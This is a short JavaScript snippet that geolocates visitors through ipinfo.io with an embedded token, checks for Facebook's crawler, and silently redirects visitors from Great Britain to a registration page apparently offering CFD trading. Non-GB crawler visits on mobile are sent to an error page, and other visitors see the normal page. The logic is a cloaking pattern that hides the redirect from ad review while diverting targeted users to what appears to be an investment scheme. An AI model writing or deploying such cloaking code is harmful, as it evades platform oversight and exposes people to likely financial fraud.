function isMobileDevice() {
  return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
}

fetch('https://ipinfo.io/json?token=0784c654f65d07')
  .then(response => response.json())
  .then(data => {
    const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
    if (!isFacebookBot && data.country !== 'GB') {
      // Si l'utilisateur n'est pas au Royaume-Uni et n'est pas un bot Facebook
      // on ne redirige pas vers une autre page et on affiche simplement la page
    } else if (data.country === 'GB') {
      window.location.replace("https://cfd.fortuna-invest.com/register");
    }
    else if(isMobileDevice()) {
      setTimeout(function() {
        window.location.replace("https://www.example.com/error-page");
      }, 1000);
    }
  });
